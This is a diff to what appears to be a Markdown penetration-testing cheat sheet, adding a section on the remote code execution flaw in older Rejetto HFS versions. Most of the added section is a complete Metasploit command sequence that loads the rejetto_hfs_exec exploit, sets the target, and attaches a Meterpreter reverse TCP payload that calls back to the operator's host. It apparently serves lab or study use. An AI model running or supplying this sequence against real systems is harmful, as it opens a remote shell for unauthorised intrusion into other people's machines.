@@ -45,3 +45,21 @@ use <module_name>
 set RHOSTS <target IP>
 run
 ```
+
+## Rejetto HFS
+Rejetto HFS (HTTP File Server) is a file-sharing application for Windows that provides an easy way to share files over HTTP. However, older versions of HFS (like 2.3 and 2.3c) are vulnerable to Remote Code Execution (RCE). Metasploit can exploit this vulnerability effectively.
+
+#### Exploitation
+
+```bash
+msfconsole
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec
+set RHOST <target_ip>
+set RPORT <target_port>
+set TARGETURI /
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your_ip>
+set LPORT <your_port>
+run
+```
